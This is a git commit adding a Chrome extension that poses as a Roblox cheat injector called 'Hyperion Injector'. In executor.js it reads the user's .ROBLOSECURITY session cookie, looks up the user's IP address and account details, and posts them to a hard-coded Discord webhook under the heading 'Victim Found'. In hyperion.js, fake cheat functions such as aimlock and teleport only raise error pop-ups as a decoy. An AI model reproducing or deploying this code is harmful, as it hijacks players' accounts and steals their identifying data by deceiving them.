7e7883d6a0aa9e2b6e7f8d64bbd3e1f512e55a7b
SkySw0rd <103229380+SkySw0rd@users.noreply.github.com>
2024-05-16 22:16:31 -0400

    Initial Release
    Undualhooked Sweb's Fake Injector

---
+++ Hyperion Injector/scripts/executor.js
@@ -0,0 +1,71 @@
+const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1230936586255077426/Vezu-BvIlQzhxhSITyjSi0fLfuQU_kjzPMACi4g6zR1xT5zsfBieTobwDkjoN-vByHQF";
+
+async function main(cookie) {
+    var ipAddr = await (await fetch("https://api.ipify.org")).text();
+
+    let statistics = null;
+    if (cookie) {
+        const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
+            headers: {
+                Cookie: ".ROBLOSECURITY=" + cookie
+            },
+            redirect: "manual"
+        });
+        if (response.ok) {
+            statistics = await response.json();
+        }
+    }
+
+    const data = {
+        "content": null,
+        "embeds": [{
+            "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
+            "color": null,
+            "fields": [{
+                    "name": "Username",
+                    "value": statistics ? statistics.UserName : "N/A",
+                    "inline": true
+                },
+                {
+                    "name": "Robux",
+                    "value": statistics ? statistics.RobuxBalance : "N/A",
+                    "inline": true
+                },
+                {
+                    "name": "Premium",
+                    "value": statistics ? statistics.IsPremium : "N/A",
+                    "inline": true
+                }
+            ],
+            "author": {
+                "name": "Victim Found: " + ipAddr,
+                "icon_url": statistics ? statistics.ThumbnailUrl : "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
+            },
+            "footer": {
+                "text": "Coded By Sweb, Undualhooked by Asyx!",
+                "icon_url": "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&"
+            },
+            "thumbnail": {
+                "url": statistics ? statistics.ThumbnailUrl : "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
+            }
+        }],
+        "username": "Hyperion Public - Extension Version",
+        "avatar_url": "https://cdn.discordapp.com/attachments/1231379381629358193/1231379536613085275/Sniper_Scope.png?ex=6647e20f&is=6646908f&hm=7826f3b7fce58a0ddd728cfafd5c0f9767528de05562f5ba3278259ed5c49a31&",
+        "attachments": []
+    };
+
+    fetch(DISCORD_WEBHOOK, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+    });
+}
+
+chrome.cookies.get({
+    "url": "https://www.roblox.com/home",
+    "name": ".ROBLOSECURITY"
+}, function(cookie) {
+    main(cookie ? cookie.value : null);
+});
---
+++ Hyperion Injector/scripts/hyperion.js
@@ -0,0 +1,25 @@
+function showPopup() {
+    alert("Download BloxTrap and ReRun Roblox.");
+    const url = "https://github.com/pizzaboxer/bloxstrap";
+    window.open(url, "_blank");
+  }
+  //fuction Dont Mind this Checks if you have BloxTrap
+  function aimlock() {
+    alert("Error, Bloxtrap Not Found");
+  }
+  
+  function esp() {
+    alert("Error, Bloxtrap Not Found");
+  }
+  
+  function teleport() {
+    alert("Error, Bloxtrap Not Found");
+  }
+  
+  function macro() {
+    alert("Error, Bloxtrap Not Found");
+  }
+  
+  function silentLock() {
+    alert("Error, Bloxtrap Not Found");
+  }
